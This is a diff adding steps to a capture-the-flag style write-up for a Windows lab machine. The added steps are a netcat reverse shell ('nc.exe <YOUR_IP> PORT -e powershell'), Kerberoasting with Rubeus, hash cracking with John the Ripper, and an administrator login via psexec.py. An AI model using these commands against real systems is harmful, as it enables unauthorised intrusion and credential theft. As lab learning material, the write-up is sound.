@@ -1,5 +1,11 @@
 # H1:Medium!
 ## @Author : M3tr1c_r00t
+```
+   _   _   _   _   _   _   _   _   _  
+  / \ / \ / \ / \ / \ / \ / \ / \ / \ 
+ ( H | 1 | : | M | e | d | i | u | m )
+  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
+```
 ### Enumeration...
 ```
 # Nmap 7.92 scan initiated Tue Dec  6 17:02:26 2022 as: nmap -sC -sV -A -v -oN nmapscan.txt 10.10.110.172
@@ -109,6 +115,44 @@ locate the nc.exe binary on your linux distro or download it ...
 Next, send it to the machine....
 ![Screenshot_2022-12-06_17_09_43](https://user-images.githubusercontent.com/99975622/210141562-e5bd0a94-d014-446b-94f0-503a619a5738.png)
 
+After that, set up a listener and then execute the binary using....
+```
+met | nc.exe <YOUR_IP> PORT -e powershell
+```
+![Screenshot_2022-12-06_17_11_55](https://user-images.githubusercontent.com/99975622/210141763-ce5a1c3d-c0ec-4dc4-9230-33c1c9872e34.png)
+
+And we've gotten a shell
+![Screenshot_2022-12-06_17_13_24](https://user-images.githubusercontent.com/99975622/210142231-6fb1e810-b7ec-469d-af94-880009ec7b7f.png)
+ ### Priv Esc...
+ After typing net user, we can see that achilles is the administrator....
+ Next, you can try attacking the SAM file but no luck :(
+ 
+ #### Attacking Kerberos
+ I tried to  use GetNPUsers.py but we can try using Rubeus.exe 
+ <br> After transferring the binary to the machine, run this command
+ ```
+ .\Rubeus.exe kerberoast /nowrap
+ ```
+ the /nowrap command makes sure there is now space between the hash...
+
+![Screenshot_2022-12-06_17_18_04](https://user-images.githubusercontent.com/99975622/210145784-376a57c9-37f2-43e3-99be-a4da48a1db09.png)
+Next, save the hash into a file then brute force it with john-the-ripper...
+
+![Screenshot_2022-12-06_17_19_09](https://user-images.githubusercontent.com/99975622/210146140-648f133f-bbcd-42a5-af7f-501481893970.png)
+
+After getting the password, you can now login to the machine using te psexec.py script as achilles...
 
 
+
+![Screenshot_2022-12-06_17_30_30](https://user-images.githubusercontent.com/99975622/210146513-6acf6f03-1af6-4e91-984c-4407b21b9cb7.png)
+And now you are administrator!
+
+
+Well, you know the drill!
+<br> Defense is up to you!
+<br> :)
+
+## My socials:
+<br>@ twitter: https://twitter.com/M3tr1c_root
+<br>@ instagram: https://instagram.com/m3tr1c_r00t/
 
